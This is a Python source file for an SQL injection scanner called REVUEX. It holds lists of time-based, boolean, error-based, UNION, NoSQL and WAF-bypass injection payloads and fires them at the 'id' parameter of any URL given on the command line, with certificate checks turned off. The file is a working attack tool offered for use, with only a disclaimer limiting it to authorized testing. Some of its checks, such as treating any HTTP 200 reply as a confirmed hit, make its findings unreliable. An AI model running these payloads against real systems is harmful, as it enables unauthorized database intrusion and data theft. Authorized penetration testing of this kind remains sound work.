#!/usr/bin/env python3
"""
REVUEX - Enhanced SQL Injection Scanner
Advanced SQL Injection Detection Across All Database Types

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
SQL injection testing should only be performed on systems you own or have explicit permission to test.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urlencode

requests.packages.urllib3.disable_warnings()

class EnhancedSQLiScanner:
    """
    Advanced SQL Injection Scanner (2024/2025)

    Features:
    - Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
    - Time-based blind SQL injection
    - Boolean-based blind SQL injection
    - Error-based SQL injection
    - UNION-based SQL injection
    - Second-order SQL injection detection
    - NoSQL injection (MongoDB, CouchDB)
    - WAF bypass techniques
    - Automatic DBMS fingerprinting
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay

        self.max_requests = 100
        self.request_count = 0
        self.timeout = 10

        self.headers = {
            "User-Agent": "REVUEX-SQLiScanner/1.0",
            "Accept": "*/*"
        }

        self.vulnerabilities: List[Dict[str, Any]] = []
        self.detected_dbms: Optional[str] = None

        # === PAYLOAD DEFINITIONS (UNCHANGED LOGIC) ===

        self.time_based_payloads = {
            "mysql": [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('A'))--"
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5)--",
                "' AND pg_sleep(5)--"
            ],
            "mssql": [
                "'; WAITFOR DELAY '00:00:05'--",
                "1'; WAITFOR DELAY '00:00:05'--"
            ],
            "oracle": [
                "' AND DBMS_LOCK.SLEEP(5)--"
            ],
            "sqlite": [
                "' AND randomblob(100000000)--"
            ]
        }

        self.boolean_payloads = {
            "true": ["' OR 1=1--", "' OR 'a'='a"],
            "false": ["' OR 1=2--", "' OR 'a'='b"]
        }

        self.error_based_payloads = [
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND 1=CAST(version() AS INT)--",
            "' AND 1=CONVERT(INT,@@version)--"
        ]

        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--"
        ]

        self.nosql_payloads = [
            "{'$gt':''}",
            "{'$ne':''}",
            "admin' || '1'=='1"
        ]

        self.waf_bypasses = [
            "'/**/AND/**/1=1--",
            "'/*!50000AND*/1=1--",
            "%27%20AND%201=1--"
        ]

        self.fingerprint_queries = {
            "mysql": "' AND @@version--",
            "postgresql": "' AND version()--",
            "mssql": "' AND @@version--",
            "oracle": "' AND banner FROM v$version--",
            "sqlite": "' AND sqlite_version()--"
        }

    # ================= MAIN SCAN =================

    def scan(self) -> List[Dict[str, Any]]:
        print("\n" + "=" * 60)
        print("💉 REVUEX Enhanced SQLi Scanner")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Max Requests: {self.max_requests}")
        print("=" * 60)

        self._fingerprint_database()
        time.sleep(self.delay)

        self._test_time_based_blind()
        time.sleep(self.delay)

        self._test_boolean_based()
        time.sleep(self.delay)

        self._test_error_based()
        time.sleep(self.delay)

        self._test_union_based()
        time.sleep(self.delay)

        self._test_nosql_injection()
        time.sleep(self.delay)

        self._test_waf_bypasses()

        self._save_results()

        print("\n✅ Scan Complete")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"Requests Used: {self.request_count}/{self.max_requests}")
        if self.detected_dbms:
            print(f"Detected DBMS: {self.detected_dbms}")

        return self.vulnerabilities

    # ================= CORE TESTS =================

    def _make_request(self, payload: str) -> Optional[requests.Response]:
        if self.request_count >= self.max_requests:
            return None

        try:
            if "?" in self.target:
                url = self.target + "&" + urlencode({"id": payload})
            else:
                url = self.target + "?" + urlencode({"id": payload})

            response = requests.get(
                url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False
            )

            self.request_count += 1
            return response
        except Exception:
            return None

    def _fingerprint_database(self):
        print("\n🔍 Fingerprinting DBMS...")
        for dbms, payload in self.fingerprint_queries.items():
            response = self._make_request(payload)
            if response:
                text = response.text.lower()
                if dbms in text:
                    self.detected_dbms = dbms.upper()
                    print(f"   ✓ Detected DBMS: {self.detected_dbms}")
                    return
            time.sleep(self.delay)
        print("   ℹ️ DBMS not detected")

    def _test_time_based_blind(self):
        print("\n⏱️ Time-Based Blind SQLi")
        for dbms, payloads in self.time_based_payloads.items():
            for payload in payloads:
                start = time.time()
                baseline = self._make_request("")
                if not baseline:
                    continue
                base_time = time.time() - start

                start = time.time()
                injected = self._make_request(payload)
                if not injected:
                    continue
                injected_time = time.time() - start

                if injected_time - base_time > 4:
                    self.vulnerabilities.append({
                        "type": "Time-Based Blind SQL Injection",
                        "severity": "critical",
                        "dbms": dbms,
                        "payload": payload,
                        "baseline_time": base_time,
                        "response_time": injected_time
                    })
                    print(f"   ✓ Vulnerable ({dbms})")
                    return

    def _test_boolean_based(self):
        print("\n🔀 Boolean-Based SQLi")
        t = self._make_request(self.boolean_payloads["true"][0])
        f = self._make_request(self.boolean_payloads["false"][0])
        if t and f and abs(len(t.text) - len(f.text)) > 100:
            self.vulnerabilities.append({
                "type": "Boolean-Based Blind SQL Injection",
                "severity": "critical"
            })
            print("   ✓ Boolean SQLi confirmed")

    def _test_error_based(self):
        print("\n❌ Error-Based SQLi")
        for payload in self.error_based_payloads:
            response = self._make_request(payload)
            if response and self._check_sql_error(response.text):
                self.vulnerabilities.append({
                    "type": "Error-Based SQL Injection",
                    "severity": "critical",
                    "payload": payload
                })
                print("   ✓ Error-based SQLi found")
                return

    def _test_union_based(self):
        print("\n🔗 UNION-Based SQLi")
        for payload in self.union_payloads:
            response = self._make_request(payload)
            if response and response.status_code == 200:
                self.vulnerabilities.append({
                    "type": "UNION-Based SQL Injection",
                    "severity": "critical",
                    "payload": payload
                })
                print("   ✓ UNION SQLi confirmed")
                return

    def _test_nosql_injection(self):
        print("\n📊 NoSQL Injection")
        for payload in self.nosql_payloads:
            response = self._make_request(payload)
            if response and response.status_code == 200:
                self.vulnerabilities.append({
                    "type": "NoSQL Injection",
                    "severity": "high",
                    "payload": payload
                })
                print("   ✓ NoSQL injection possible")
                return

    def _test_waf_bypasses(self):
        print("\n🛡️ WAF Bypass Techniques")
        for payload in self.waf_bypasses:
            response = self._make_request(payload)
            if response and response.status_code != 403:
                self.vulnerabilities.append({
                    "type": "SQL Injection - WAF Bypass",
                    "severity": "high",
                    "payload": payload
                })
                print("   ✓ WAF bypass successful")
                return

    # ================= HELPERS =================

    def _check_sql_error(self, text: str) -> bool:
        errors = [
            "sql syntax", "mysql", "postgresql", "ora-", "sqlite", "odbc"
        ]
        text = text.lower()
        return any(e in text for e in errors)

    def _save_results(self):
        output_dir = self.workspace / "sqli_scans"
        output_dir.mkdir(parents=True, exist_ok=True)

        safe_target = re.sub(r"[^\w\-]", "_", self.target)
        output_file = output_dir / f"{safe_target}_sqli.json"

        with open(output_file, "w") as f:
            json.dump({
                "scanner": "EnhancedSQLiScanner",
                "target": self.target,
                "dbms": self.detected_dbms,
                "vulnerabilities": self.vulnerabilities
            }, f, indent=2)

        print(f"\n💾 Results saved to: {output_file}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python sqli_scanner.py <target_url>")
        sys.exit(1)

    scanner = EnhancedSQLiScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
    scanner.scan()